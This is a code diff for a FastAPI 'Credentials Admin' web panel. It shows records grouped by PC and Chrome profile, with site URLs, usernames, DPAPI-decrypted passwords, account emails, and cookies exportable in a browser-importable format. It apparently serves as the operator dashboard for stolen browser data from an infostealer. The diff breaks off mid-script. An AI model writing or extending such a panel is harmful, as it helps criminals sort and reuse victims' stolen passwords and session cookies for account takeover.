@@ -1,7 +1,16 @@
-from fastapi import APIRouter, Query
-from fastapi.responses import HTMLResponse, JSONResponse
+import html
+import json
+import re
+import secrets
+from collections import defaultdict
+from typing import Any
+
+from fastapi import APIRouter, Depends, HTTPException, Query, status
+from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
+from fastapi.security import HTTPBasic, HTTPBasicCredentials
 from pydantic import BaseModel
 
+from app.config import ADMIN_AUTH_PASSWORD, ADMIN_AUTH_USER, ENVIRONMENT
 from app.repository import (
     get_payload_by_id,
     list_distinct_environments,
@@ -11,156 +20,316 @@ from app.repository import (
     update_pc_tag,
 )
 
-router = APIRouter()
+security = HTTPBasic()
+
+
+def verify_admin_basic_auth(credentials: HTTPBasicCredentials = Depends(security)) -> None:
+    user_ok = secrets.compare_digest(credentials.username, ADMIN_AUTH_USER)
+    password_ok = secrets.compare_digest(credentials.password, ADMIN_AUTH_PASSWORD)
+    if not (user_ok and password_ok):
+        raise HTTPException(
+            status_code=status.HTTP_401_UNAUTHORIZED,
+            detail="Unauthorized",
+            headers={"WWW-Authenticate": 'Basic realm="admin"'},
+        )
+
+
+router = APIRouter(dependencies=[Depends(verify_admin_basic_auth)])
 
 
 class PcTagBody(BaseModel):
     tag: str | None = None
 
 
-@router.get("/admin-credentials", response_class=HTMLResponse)
-async def admin_page() -> HTMLResponse:
-    return HTMLResponse(_ADMIN_HTML)
+def sort_profile_names(names: list[str]) -> list[str]:
+    def sort_key(name: str) -> tuple[int, int | str]:
+        if name == "Default":
+            return (0, 0)
+        match = re.match(r"Profile (\d+)$", name)
+        if match:
+            return (1, int(match.group(1)))
+        return (2, name)
+
+    return sorted(names, key=sort_key)
 
 
-@router.get("/admin-credentials/payloads")
-async def admin_list_payloads(
-    environment: str = Query(default="production"),
-    pc_name: str | None = Query(default=None),
-    page: int = Query(default=1, ge=1),
-    page_size: int = Query(default=20, ge=1, le=100),
-) -> JSONResponse:
-    items, total = list_payloads(
-        environment=environment or None,
-        pc_name=pc_name or None,
-        page=page,
-        page_size=page_size,
+def group_passwords_by_profile(content: dict[str, Any]) -> dict[str, list[dict[str, Any]]]:
+    grouped: dict[str, list[dict[str, Any]]] = defaultdict(list)
+    for entry in content.get("passwords") or []:
+        if not isinstance(entry, dict):
+            continue
+        profile = str(entry.get("profile") or "Unknown")
+        grouped[profile].append(entry)
+    for profile in grouped:
+        grouped[profile].sort(key=lambda item: (item.get("url") or "", item.get("username") or ""))
+    return dict(grouped)
+
+
+def get_profile_metadata(content: dict[str, Any], folder: str) -> dict[str, Any]:
+    profiles = content.get("profiles")
+    if not isinstance(profiles, dict):
+        return {}
+    meta = profiles.get(folder)
+    return meta if isinstance(meta, dict) else {}
+
+
+def resolve_password_value(entry: dict[str, Any]) -> str:
+    password_dpapi = str(entry.get("password_dpapi") or "").strip()
+    if password_dpapi:
+        return password_dpapi
+    password = str(entry.get("password") or "").strip()
+    if password and "App-Bound Encryption" not in password:
+        return password
+    return ""
+
+
+def group_cookies_by_profile(content: dict[str, Any]) -> dict[str, list[dict[str, Any]]]:
+    grouped: dict[str, list[dict[str, Any]]] = defaultdict(list)
+    for entry in content.get("cookies") or []:
+        if not isinstance(entry, dict):
+            continue
+        profile = str(entry.get("profile") or "Unknown")
+        grouped[profile].append(entry)
+    for profile in grouped:
+        grouped[profile].sort(
+            key=lambda item: (item.get("host") or "", item.get("name") or "", item.get("path") or "")
+        )
+    return dict(grouped)
+
+
+def profile_tab_label(
+    folder: str,
+    meta: dict[str, Any],
+    password_count: int,
+    cookie_count: int = 0,
+) -> str:
+    label = (
+        str(meta.get("name") or "").strip()
+        or str(meta.get("gaia_name") or "").strip()
+        or folder
     )
-    total_pages = (total + page_size - 1) // page_size if total else 0
-    return JSONResponse(
-        {
-            "items": items,
-            "total": total,
-            "page": page,
-            "page_size": page_size,
-            "total_pages": total_pages,
-        }
+    parts = []
+    if password_count:
+        parts.append(f"{password_count} pwd")
+    if cookie_count:
+        parts.append(f"{cookie_count} cookies")
+    if parts:
+        return f"{label} ({', '.join(parts)})"
+    return label
+
+
+def collect_profile_names(content: dict[str, Any]) -> list[str]:
+    password_profiles = set(group_passwords_by_profile(content).keys())
+    cookie_profiles = set(group_cookies_by_profile(content).keys())
+    return sort_profile_names(list(password_profiles | cookie_profiles))
+
+
+def render_copy_button(value: str) -> str:
+    if not value:
+        return ""
+    return (
+        f'<button type="button" class="copy-btn" data-copy="{html.escape(value, quote=True)}" '
+        f'title="Copy" aria-label="Copy">Copy</button>'
     )
 
 
-@router.get("/admin-credentials/payloads/{payload_id}")
-async def admin_get_payload(payload_id: int) -> JSONResponse:
-    payload = get_payload_by_id(payload_id)
-    if payload is None:
-        return JSONResponse({"error": "not found"}, status_code=404)
-    return JSONResponse(payload)
-
-
-@router.get("/admin-credentials/filters")
-async def admin_filters(environment: str = Query(default="production")) -> JSONResponse:
-    return JSONResponse(
-        {
-            "environments": list_distinct_environments(),
-            "pc_names": list_distinct_pc_names(environment=environment or None),
-        }
+def render_copy_cell(value: str, *, mono: bool = False) -> str:
+    if not value:
+        return '<span class="password-empty">—</span>'
+    text_class = "cell-text mono" if mono else "cell-text password-value"
+    return (
+        f'<div class="copy-cell">'
+        f'<span class="{text_class}">{html.escape(value)}</span>'
+        f"{render_copy_button(value)}"
+        f"</div>"
     )
 
 
-@router.get("/admin-credentials/pcs")
-async def admin_list_pcs(
-    environment: str = Query(default="production"),
-    page: int = Query(default=1, ge=1),
-    page_size: int = Query(default=20, ge=1, le=100),
-) -> JSONResponse:
-    items, total = list_pcs(environment=environment or None, page=page, page_size=page_size)
-    total_pages = (total + page_size - 1) // page_size if total else 0
-    return JSONResponse(
-        {
-            "items": items,
-            "total": total,
-            "page": page,
-            "page_size": page_size,
-            "total_pages": total_pages,
-        }
-    )
+def render_password_rows(passwords: list[dict[str, Any]]) -> str:
+    if not passwords:
+        return '<tr><td colspan="3" class="empty">No passwords for this profile.</td></tr>'
+
+    rows = []
+    for entry in passwords:
+        url = str(entry.get("url") or "")
+        username = str(entry.get("username") or "")
+        password = resolve_password_value(entry)
+        rows.append(
+            "<tr>"
+            f'<td class="mono">{html.escape(url) if url else "—"}</td>'
+            f"<td>{render_copy_cell(username)}</td>"
+            f"<td>{render_copy_cell(password)}</td>"
+            "</tr>"
+        )
+    return "".join(rows)
 
 
-@router.put("/admin-credentials/pcs/{pc_id}")
-async def admin_update_pc(pc_id: int, body: PcTagBody) -> JSONResponse:
-    updated = update_pc_tag(pc_id, body.tag)
-    if updated is None:
-        return JSONResponse({"error": "not found"}, status_code=404)
-    return JSONResponse(updated)
+def render_record_profiles(content: dict[str, Any]) -> str:
+    passwords_by_profile = group_passwords_by_profile(content)
+    cookies_by_profile = group_cookies_by_profile(content)
+    profile_names = collect_profile_names(content)
+
+    if not profile_names:
+        return '<div class="empty">No passwords or cookies in this record.</div>'
+
+    tabs = []
+    panels = []
+
+    for index, folder in enumerate(profile_names):
+        passwords = passwords_by_profile.get(folder, [])
+        cookie_count = len(cookies_by_profile.get(folder, []))
+        meta = get_profile_metadata(content, folder)
+        active = " active" if index == 0 else ""
+        tab_id = html.escape(folder, quote=True)
+        label = html.escape(profile_tab_label(folder, meta, len(passwords), cookie_count))
+        cookie_actions = ""
+        if cookie_count:
+            cookie_actions = f"""<div class="profile-toolbar">
+        <span class="profile-count">{cookie_count} cookies</span>
+        <button type="button" class="view-cookies-btn" data-profile="{tab_id}">View cookies JSON</button>
+        <button type="button" class="copy-cookies-btn primary" data-profile="{tab_id}">Copy importable cookies</button>
+      </div>"""
+        tabs.append(
+            f'<button type="button" class="profile-tab{active}" data-profile="{tab_id}">{label}</button>'
+        )
+        panels.append(
+            f"""<section class="profile-panel{active}" data-profile="{tab_id}">
+      {render_profile_meta(folder, meta)}
+      {cookie_actions}
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th>URL</th>
+              <th>Username</th>
+              <th>Password</th>
+            </tr>
+          </thead>
+          <tbody>
+            {render_password_rows(passwords)}
+          </tbody>
+        </table>
+      </div>
+    </section>"""
+        )
+
+    return f"""<div class="profile-tabs">{"".join(tabs)}</div>
+    <div class="profile-panels">{"".join(panels)}</div>"""
 
 
-_ADMIN_HTML = """<!DOCTYPE html>
+def render_profile_meta(folder: str, meta: dict[str, Any]) -> str:
+    email = str(meta.get("email") or meta.get("user_name") or "").strip()
+    display_name = str(meta.get("gaia_name") or meta.get("name") or "").strip()
+    profile_name = str(meta.get("name") or "").strip()
+    hosted_domain = str(meta.get("hosted_domain") or "").strip()
+
+    items = [
+        ("Chrome folder", folder),
+    ]
+    if profile_name:
+        items.append(("Profile name", profile_name))
+    if display_name and display_name != profile_name:
+        items.append(("Display name", display_name))
+    if email:
+        items.append(("Email", email))
+    if hosted_domain:
+        items.append(("Hosted domain", hosted_domain))
+
+    if len(items) == 1:
+        items.append(("Metadata", "Not available for this record"))
+
+    parts = []
+    for label, value in items:
+        parts.append(
+            f"""<div class="profile-meta-item">
+        <span class="profile-meta-label">{html.escape(label)}</span>
+        <span class="profile-meta-value">{html.escape(value)}</span>
+      </div>"""
+        )
+    return f'<div class="profile-meta-card">{"".join(parts)}</div>'
+
+
+def render_layout(*, title: str, active_tab: str, content: str, scripts: str = "") -> str:
+    records_active = "active" if active_tab == "records" else ""
+    pcs_active = "active" if active_tab == "pcs" else ""
+
+    return f"""<!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Admin</title>
+  <title>{html.escape(title)} · Admin</title>
   <style>
-    * { box-sizing: border-box; }
-    body {
+    * {{ box-sizing: border-box; }}
+    body {{
       font-family: system-ui, sans-serif;
       margin: 0;
       background: #0f1115;
       color: #e6e8eb;
       min-height: 100vh;
-    }
-    header {
+    }}
+    header {{
       padding: 1rem 1.25rem;
       border-bottom: 1px solid #2a2f3a;
       background: #151820;
-    }
-    header h1 { margin: 0; font-size: 1.1rem; font-weight: 600; }
-    .tabs {
+    }}
+    header h1 {{ margin: 0; font-size: 1.1rem; font-weight: 600; }}
+    header h1 a {{
+      color: inherit;
+      text-decoration: none;
+    }}
+    .tabs {{
       display: flex;
       gap: 0.5rem;
       padding: 0.75rem 1.25rem 0;
       border-bottom: 1px solid #2a2f3a;
       background: #151820;
-    }
-    .tab {
+    }}
+    .tab {{
+      display: inline-block;
       padding: 0.55rem 0.9rem;
       border: 1px solid transparent;
       border-bottom: none;
       border-radius: 6px 6px 0 0;
       background: transparent;
       color: #9aa3b2;
-      cursor: pointer;
+      text-decoration: none;
       font: inherit;
-    }
-    .tab.active {
+    }}
+    .tab:hover {{ color: #e6e8eb; }}
+    .tab.active {{
       background: #0f1115;
       border-color: #2a2f3a;
       color: #e6e8eb;
-    }
-    .panel[hidden] { display: none; }
-    .container { padding: 1rem 1.25rem 2rem; max-width: 1200px; margin: 0 auto; }
-    .toolbar {
+    }}
+    .container {{ padding: 1rem 1.25rem 2rem; max-width: 1200px; margin: 0 auto; }}
+    .toolbar {{
       display: flex;
       flex-wrap: wrap;
       gap: 0.75rem;
       align-items: end;
       margin-bottom: 1rem;
-    }
-    label {
+    }}
+    .toolbar-spaced {{
+      justify-content: space-between;
+      align-items: center;
+    }}
+    label {{
       display: grid;
       gap: 0.35rem;
       font-size: 0.8rem;
       color: #9aa3b2;
       min-width: 160px;
-    }
-    select {
+    }}
+    select {{
       padding: 0.55rem 0.65rem;
       border: 1px solid #2a2f3a;
       border-radius: 6px;
       background: #0f1115;
       color: #e6e8eb;
       font: inherit;
-    }
-    button {
+    }}
+    button, .button-link {{
       padding: 0.55rem 0.85rem;
       border: 1px solid #3d4660;
       border-radius: 6px;
@@ -168,111 +337,97 @@ _ADMIN_HTML = """<!DOCTYPE html>
       color: #e6e8eb;
       font: inherit;
       cursor: pointer;
-    }
-    button:hover { background: #252d3f; }
-    button.primary { background: #2563eb; border-color: #2563eb; }
-    button.primary:hover { background: #1d4ed8; }
-    button:disabled { opacity: 0.45; cursor: not-allowed; }
-    .table-wrap {
+      text-decoration: none;
+      display: inline-block;
+    }}
+    button:hover, .button-link:hover {{ background: #252d3f; }}
+    button.primary, .button-link.primary {{ background: #2563eb; border-color: #2563eb; }}
+    button.primary:hover, .button-link.primary:hover {{ background: #1d4ed8; }}
+    button:disabled {{ opacity: 0.45; cursor: not-allowed; }}
+    .table-wrap {{
       border: 1px solid #2a2f3a;
       border-radius: 8px;
       overflow: hidden;
       background: #151820;
-    }
-    table { width: 100%; border-collapse: collapse; }
-    th, td {
+    }}
+    table {{ width: 100%; border-collapse: collapse; }}
+    th, td {{
       padding: 0.75rem 1rem;
       text-align: left;
       border-bottom: 1px solid #2a2f3a;
       font-size: 0.88rem;
-    }
-    th {
+    }}
+    th {{
       background: #1a2030;
       color: #9aa3b2;
       font-size: 0.78rem;
       font-weight: 600;
       text-transform: uppercase;
       letter-spacing: 0.03em;
-    }
-    tr:last-child td { border-bottom: none; }
-    tbody tr { cursor: pointer; }
-    tbody tr:hover { background: #1a2030; }
-    .mono { font-family: ui-monospace, monospace; font-size: 0.82rem; }
-    .empty {
+    }}
+    tr:last-child td {{ border-bottom: none; }}
+    tbody tr.clickable {{ cursor: pointer; }}
+    tbody tr.clickable:hover {{ background: #1a2030; }}
+    .mono {{ font-family: ui-monospace, monospace; font-size: 0.82rem; }}
+    .empty {{
       padding: 2rem;
       text-align: center;
       color: #9aa3b2;
-    }
-    .pagination {
+    }}
+    .pagination {{
       display: flex;
       align-items: center;
       justify-content: space-between;
       gap: 0.75rem;
       margin-top: 1rem;
       flex-wrap: wrap;
-    }
-    .pagination-info { font-size: 0.85rem; color: #9aa3b2; }
-    .pagination-controls { display: flex; gap: 0.5rem; align-items: center; }
-    .page-indicator { font-size: 0.85rem; min-width: 100px; text-align: center; }
-    .modal-backdrop {
-      position: fixed;
-      inset: 0;
-      background: rgba(0, 0, 0, 0.65);
+    }}
+    .pagination-info {{ font-size: 0.85rem; color: #9aa3b2; }}
+    .pagination-controls {{ display: flex; gap: 0.5rem; align-items: center; }}
+    .page-indicator {{ font-size: 0.85rem; min-width: 100px; text-align: center; }}
+    .detail-header {{
       display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 1rem;
-      z-index: 100;
-    }
-    .modal-backdrop[hidden] { display: none; }
-    .modal {
-      width: min(900px, 100%);
-      max-height: 90vh;
-      background: #151820;
-      border: 1px solid #2a2f3a;
-      border-radius: 10px;
-      display: flex;
-      flex-direction: column;
-      overflow: hidden;
-    }
-    .modal-header {
-      display: flex;
+      flex-wrap: wrap;
       align-items: center;
       justify-content: space-between;
       gap: 0.75rem;
-      padding: 1rem 1.25rem;
-      border-bottom: 1px solid #2a2f3a;
-    }
-    .modal-title { font-weight: 600; font-size: 0.95rem; }
-    .modal-actions { display: flex; gap: 0.5rem; }
-    .modal-body {
-      padding: 1rem 1.25rem 1.25rem;
-      overflow: auto;
-    }
-    pre {
+      margin-bottom: 1rem;
+    }}
+    .detail-title {{
+      margin: 0;
+      font-size: 1rem;
+      font-weight: 600;
+    }}
+    .detail-meta {{
+      font-size: 0.85rem;
+      color: #9aa3b2;
+      margin: 0.25rem 0 0;
+    }}
+    .detail-actions {{ display: flex; gap: 0.5rem; flex-wrap: wrap; }}
+    pre {{
       margin: 0;
       padding: 1rem;
       border: 1px solid #2a2f3a;
       border-radius: 8px;
       background: #0b0d11;
       overflow: auto;
-      max-height: calc(90vh - 140px);
+      max-height: calc(100vh - 220px);
       font-size: 0.78rem;
       line-height: 1.45;
       white-space: pre-wrap;
       word-break: break-word;
-    }
-    .status { font-size: 0.8rem; color: #22c55e; margin-top: 0.5rem; min-height: 1rem; }
-    .tag-pill {
+    }}
+    .status {{ font-size: 0.8rem; color: #22c55e; margin-top: 0.5rem; min-height: 1rem; }}
+    .tag-pill {{
       display: inline-block;
       padding: 0.15rem 0.45rem;
       border-radius: 999px;
       background: #1e3a5f;
       color: #93c5fd;
       font-size: 0.75rem;
-    }
-    .tag-muted { color: #6b7280; font-size: 0.78rem; }
-    .tag-input {
+    }}
+    .tag-muted {{ color: #6b7280; font-size: 0.78rem; }}
+    .tag-input {{
       width: 100%;
       min-width: 180px;
       padding: 0.5rem 0.65rem;
@@ -281,19 +436,147 @@ _ADMIN_HTML = """<!DOCTYPE html>
       background: #0f1115;
       color: #e6e8eb;
       font: inherit;
-    }
-    .row-actions { display: flex; gap: 0.5rem; align-items: center; }
-    .save-status { font-size: 0.78rem; color: #22c55e; min-width: 4rem; }
+    }}
+    .row-actions {{ display: flex; gap: 0.5rem; align-items: center; }}
+    .save-status {{ font-size: 0.78rem; color: #22c55e; min-width: 4rem; }}
+    .profile-tabs {{
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.4rem;
+      margin-bottom: 1rem;
+    }}
+    .profile-tab {{
+      padding: 0.45rem 0.75rem;
+      border: 1px solid #2a2f3a;
+      border-radius: 999px;
+      background: #151820;
+      color: #9aa3b2;
+      font: inherit;
+      font-size: 0.82rem;
+      cursor: pointer;
+    }}
+    .profile-tab:hover {{ color: #e6e8eb; border-color: #3d4660; }}
+    .profile-tab.active {{
+      background: #2563eb;
+      border-color: #2563eb;
+      color: #fff;
+    }}
+    .profile-panel {{ display: none; }}
+    .profile-panel.active {{ display: block; }}
+    .profile-meta-card {{
+      display: flex;
+      flex-wrap: wrap;
+      gap: 1rem 2rem;
+      padding: 0.85rem 1rem;
+      margin-bottom: 1rem;
+      border: 1px solid #2a2f3a;
+      border-radius: 8px;
+      background: #151820;
+      font-size: 0.85rem;
+    }}
+    .profile-meta-item {{
+      display: grid;
+      gap: 0.2rem;
+    }}
+    .profile-meta-label {{
+      color: #9aa3b2;
+      font-size: 0.72rem;
+      text-transform: uppercase;
+      letter-spacing: 0.03em;
+    }}
+    .profile-meta-value {{ color: #e6e8eb; }}
+    .password-empty {{ color: #6b7280; }}
+    .password-value {{ font-family: ui-monospace, monospace; font-size: 0.82rem; }}
+    .profile-count {{ opacity: 0.75; font-size: 0.78rem; }}
+    .profile-toolbar {{
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.5rem;
+      align-items: center;
+      margin-bottom: 1rem;
+    }}
+    .copy-cell {{
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.5rem;
+    }}
+    .cell-text {{
+      flex: 1;
+      min-width: 0;
+      word-break: break-word;
+    }}
+    .copy-btn {{
+      padding: 0.2rem 0.45rem;
+      border: 1px solid #3d4660;
+      border-radius: 4px;
+      background: #1c2230;
+      color: #9aa3b2;
+      font: inherit;
+      font-size: 0.72rem;
+      cursor: pointer;
+      flex-shrink: 0;
+    }}
+    .copy-btn:hover {{ color: #e6e8eb; background: #252d3f; }}
+    .copy-btn.copied {{ color: #22c55e; border-color: #22c55e; }}
+    .modal-backdrop {{
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.65);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1rem;
+      z-index: 100;
+    }}
+    .modal-backdrop[hidden] {{ display: none; }}
+    .modal {{
+      width: min(900px, 100%);
+      max-height: 90vh;
+      background: #151820;
+      border: 1px solid #2a2f3a;
+      border-radius: 10px;
+      display: flex;
+      flex-direction: column;
+      overflow: hidden;
+    }}
+    .modal-header {{
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 0.75rem;
+      padding: 1rem 1.25rem;
+      border-bottom: 1px solid #2a2f3a;
+    }}
+    .modal-title {{ font-weight: 600; font-size: 0.95rem; }}
+    .modal-actions {{ display: flex; gap: 0.5rem; flex-wrap: wrap; }}
+    .modal-body {{
+      padding: 1rem 1.25rem 1.25rem;
+      overflow: auto;
+    }}
   </style>
 </head>
 <body>
-  <header><h1>Credentials Admin</h1></header>
-  <div class="tabs">
-    <button type="button" class="tab active" data-tab="records">Records</button>
-    <button type="button" class="tab" data-tab="pcs">PCs</button>
-  </div>
+  <header><h1><a href="/admin-credentials/records">Credentials Admin</a></h1></header>
+  <nav class="tabs">
+    <a class="tab {records_active}" href="/admin-credentials/records">Records</a>
+    <a class="tab {pcs_active}" href="/admin-credentials/pcs">PCs</a>
+  </nav>
+  {content}
+  {scripts}
+</body>
+</html>"""
 
-  <div id="records-panel" class="panel container">
+
+@router.get("/admin-credentials")
+async def admin_root() -> RedirectResponse:
+    return RedirectResponse(url="/admin-credentials/records", status_code=302)
+
+
+@router.get("/admin-credentials/records", response_class=HTMLResponse)
+async def admin_records_page() -> HTMLResponse:
+    content = """
+  <div class="container">
     <div class="toolbar">
       <label>
         Environment
@@ -334,9 +617,368 @@ _ADMIN_HTML = """<!DOCTYPE html>
         <button type="button" id="next-btn">Next</button>
       </div>
     </div>
+  </div>"""
+
+    scripts = """
+  <script>
+    const DEFAULT_ENVIRONMENT = __DEFAULT_ENVIRONMENT__;
+    const adminFetch = (url, options = {}) => fetch(url, { credentials: "same-origin", ...options });
+    const envFilter = document.getElementById("env-filter");
+    const pcFilter = document.getElementById("pc-filter");
+    const tableBody = document.getElementById("table-body");
+    const tableEmpty = document.getElementById("table-empty");
+    const paginationInfo = document.getElementById("pagination-info");
+    const pageIndicator = document.getElementById("page-indicator");
+    const prevBtn = document.getElementById("prev-btn");
+    const nextBtn = document.getElementById("next-btn");
+    const refreshBtn = document.getElementById("refresh-btn");
+
+    const PAGE_SIZE = 20;
+    let currentPage = 1;
+    let totalPages = 0;
+
+    function escapeHtml(value) {
+      return String(value)
+        .replaceAll("&", "&amp;")
+        .replaceAll("<", "&lt;")
+        .replaceAll(">", "&gt;")
+        .replaceAll('"', "&quot;");
+    }
+
+    async function loadFilters() {
+      const env = envFilter.value || DEFAULT_ENVIRONMENT;
+      const res = await adminFetch(`/admin-credentials/filters?environment=${encodeURIComponent(env)}`);
+      const data = await res.json();
+
+      const prevEnv = envFilter.value;
+      envFilter.innerHTML = "";
+      const envs = data.environments.length ? data.environments : [DEFAULT_ENVIRONMENT];
+      for (const e of envs) {
+        const opt = document.createElement("option");
+        opt.value = e;
+        opt.textContent = e;
+        envFilter.appendChild(opt);
+      }
+      envFilter.value = envs.includes(prevEnv) ? prevEnv : (envs.includes(DEFAULT_ENVIRONMENT) ? DEFAULT_ENVIRONMENT : envs[0]);
+
+      const prevPc = pcFilter.value;
+      pcFilter.innerHTML = '<option value="">All</option>';
+      for (const pc of data.pc_names) {
+        const opt = document.createElement("option");
+        opt.value = pc;
+        opt.textContent = pc;
+        pcFilter.appendChild(opt);
+      }
+      pcFilter.value = [...pcFilter.options].some(o => o.value === prevPc) ? prevPc : "";
+    }
+
+    async function loadList(page = currentPage) {
+      currentPage = page;
+      const params = new URLSearchParams();
+      params.set("environment", envFilter.value || DEFAULT_ENVIRONMENT);
+      params.set("page", String(currentPage));
+      params.set("page_size", String(PAGE_SIZE));
+      if (pcFilter.value) params.set("pc_name", pcFilter.value);
+
+      const res = await adminFetch(`/admin-credentials/payloads?${params}`);
+      const data = await res.json();
+
+      totalPages = data.total_pages;
+      tableBody.innerHTML = "";
+      tableEmpty.hidden = data.total > 0;
+
+      for (const item of data.items) {
+        const tr = document.createElement("tr");
+        tr.className = "clickable";
+        const tagHtml = item.tag
+          ? `<span class="tag-pill">${escapeHtml(item.tag)}</span>`
+          : `<span class="tag-muted">—</span>`;
+        tr.innerHTML = `
+          <td class="mono">#${item.id}</td>
+          <td>${escapeHtml(item.pc_name)}</td>
+          <td>${tagHtml}</td>
+          <td>${escapeHtml(item.environment)}</td>
+          <td class="mono">${escapeHtml(item.datetime)}</td>
+          <td>${item.password_count ?? 0}</td>
+          <td>${item.cookie_count ?? 0}</td>`;
+        tr.addEventListener("click", () => {
+          window.location.href = `/admin-credentials/records/${item.id}`;
+        });
+        tableBody.appendChild(tr);
+      }
+
+      const start = data.total ? (data.page - 1) * data.page_size + 1 : 0;
+      const end = Math.min(data.page * data.page_size, data.total);
+      paginationInfo.textContent = data.total
+        ? `Showing ${start}–${end} of ${data.total}`
+        : "No results";
+      pageIndicator.textContent = data.total ? `Page ${data.page} of ${data.total_pages}` : "";
+      prevBtn.disabled = data.page <= 1;
+      nextBtn.disabled = data.page >= data.total_pages;
+    }
+
+    envFilter.addEventListener("change", async () => {
+      await loadFilters();
+      await loadList(1);
+    });
+    pcFilter.addEventListener("change", () => loadList(1));
+    refreshBtn.addEventListener("click", async () => {
+      await loadFilters();
+      await loadList(1);
+    });
+    prevBtn.addEventListener("click", () => {
+      if (currentPage > 1) loadList(currentPage - 1);
+    });
+    nextBtn.addEventListener("click", () => {
+      if (currentPage < totalPages) loadList(currentPage + 1);
+    });
+
+    (async () => {
+      await loadFilters();
+      if (!envFilter.value) envFilter.value = DEFAULT_ENVIRONMENT;
+      await loadList(1);
+    })();
+  </script>"""
+
+    scripts = scripts.replace("__DEFAULT_ENVIRONMENT__", json.dumps(ENVIRONMENT))
+
+    return HTMLResponse(render_layout(title="Records", active_tab="records", content=content, scripts=scripts))
+
+
+@router.get("/admin-credentials/records/{payload_id}", response_class=HTMLResponse)
+async def admin_record_detail(payload_id: int) -> HTMLResponse:
+    payload = get_payload_by_id(payload_id)
+    if payload is None:
+        content = """
+  <div class="container">
+    <div class="detail-header">
+      <div>
+        <h2 class="detail-title">Record not found</h2>
+        <p class="detail-meta">No record with this ID exists.</p>
+      </div>
+      <div class="detail-actions">
+        <a class="button-link" href="/admin-credentials/records">Back to records</a>
+      </div>
+    </div>
+  </div>"""
+        return HTMLResponse(
+            render_layout(title="Not found", active_tab="records", content=content),
+            status_code=404,
+        )
+
+    pc_name = html.escape(payload["pc_name"])
+    environment = html.escape(payload["environment"])
+    recorded_at = html.escape(payload["datetime"])
+    profiles_html = render_record_profiles(payload["content"])
+
+    content = f"""
+  <div class="container" data-payload-id="{payload_id}">
+    <div class="detail-header">
+      <div>
+        <h2 class="detail-title">Record #{payload_id} · {pc_name}</h2>
+        <p class="detail-meta">{environment} · {recorded_at}</p>
+      </div>
+      <div class="detail-actions">
+        <a class="button-link" href="/admin-credentials/records">Back to records</a>
+      </div>
+    </div>
+    {profiles_html}
   </div>
 
-  <div id="pcs-panel" class="panel container" hidden>
+  <div id="cookie-modal-backdrop" class="modal-backdrop" hidden>
+    <div class="modal" role="dialog" aria-modal="true">
+      <div class="modal-header">
+        <div class="modal-title" id="cookie-modal-title">Cookies</div>
+        <div class="modal-actions">
+          <button type="button" id="cookie-modal-copy-json" class="primary">Copy JSON</button>
+          <button type="button" id="cookie-modal-copy-import">Copy importable</button>
+          <button type="button" id="cookie-modal-close">Close</button>
+        </div>
+      </div>
+      <div class="modal-body">
+        <pre id="cookie-modal-view"></pre>
+        <div class="status" id="cookie-modal-status"></div>
+      </div>
+    </div>
+  </div>"""
+
+    scripts = f"""
+  <script>
+    const payloadId = {payload_id};
+    const adminFetch = (url, options = {{}}) => fetch(url, {{ credentials: "same-origin", ...options }});
+    const profileTabs = document.querySelectorAll(".profile-tab");
+    const profilePanels = document.querySelectorAll(".profile-panel");
+    const cookieModalBackdrop = document.getElementById("cookie-modal-backdrop");
+    const cookieModalTitle = document.getElementById("cookie-modal-title");
+    const cookieModalView = document.getElementById("cookie-modal-view");
+    const cookieModalStatus = document.getElementById("cookie-modal-status");
+    const cookieModalCopyJson = document.getElementById("cookie-modal-copy-json");
+    const cookieModalCopyImport = document.getElementById("cookie-modal-copy-import");
+    const cookieModalClose = document.getElementById("cookie-modal-close");
+
+    let modalCookies = [];
+    let modalImportJson = "";
+
+    profileTabs.forEach((tab) => {{
+      tab.addEventListener("click", () => {{
+        const profile = tab.dataset.profile;
+        profileTabs.forEach((item) => item.classList.toggle("active", item === tab));
+        profilePanels.forEach((panel) => {{
+          panel.classList.toggle("active", panel.dataset.profile === profile);
+        }});
+      }});
+    }});
+
+    async function copyText(text, statusEl, button) {{
+      if (statusEl) statusEl.textContent = "";
+      try {{
+        await navigator.clipboard.writeText(text);
+        if (statusEl) statusEl.textContent = "Copied";
+        if (button) {{
+          const original = button.dataset.originalText || button.textContent;
+          button.dataset.originalText = original;
+          button.classList.add("copied");
+          button.textContent = "Copied";
+          setTimeout(() => {{
+            button.classList.remove("copied");
+            button.textContent = original;
+          }}, 1200);
+        }}
+      }} catch (e) {{
+        const textarea = document.createElement("textarea");
+        textarea.value = text;
+        textarea.style.position = "fixed";
+        textarea.style.opacity = "0";
+        document.body.appendChild(textarea);
+        textarea.select();
+        const ok = document.execCommand("copy");
+        textarea.remove();
+        if (statusEl) statusEl.textContent = ok ? "Copied" : "Could not copy";
+      }}
+    }}
+
+    document.querySelectorAll(".copy-btn").forEach((button) => {{
+      button.addEventListener("click", (event) => {{
+        event.stopPropagation();
+        copyText(button.dataset.copy || "", null, button);
+      }});
+    }});
+
+    function chromeTimeToUnix(expires) {{
+      if (!expires || expires <= 0) return 0;
+      const unix = Math.floor(Number(expires) / 1000000 - 11644473600);
+      return unix > 0 ? unix : 0;
+    }}
+
+    function resolveCookieValue(cookie) {{
+      return cookie.value_dpapi || cookie.value || "";
+    }}
+
+    function cookiesToImportJson(cookies) {{
+      return cookies.map((cookie) => {{
+        const host = cookie.host || "";
+        const unix = chromeTimeToUnix(cookie.expires);
+        const session = !cookie.expires || Number(cookie.expires) <= 0;
+        return {{
+          domain: host,
+          expirationDate: session ? undefined : unix,
+          hostOnly: !host.startsWith("."),
+          httpOnly: !!cookie.httpOnly,
+          name: cookie.name || "",
+          path: cookie.path || "/",
+          sameSite: "unspecified",
+          secure: !!cookie.secure,
+          session,
+          storeId: "0",
+          value: resolveCookieValue(cookie),
+        }};
+      }});
+    }}
+
+    async function fetchProfileCookies(profile) {{
+      const params = new URLSearchParams({{ profile }});
+      const res = await adminFetch(`/admin-credentials/payloads/${{payloadId}}/cookies?${{params}}`);
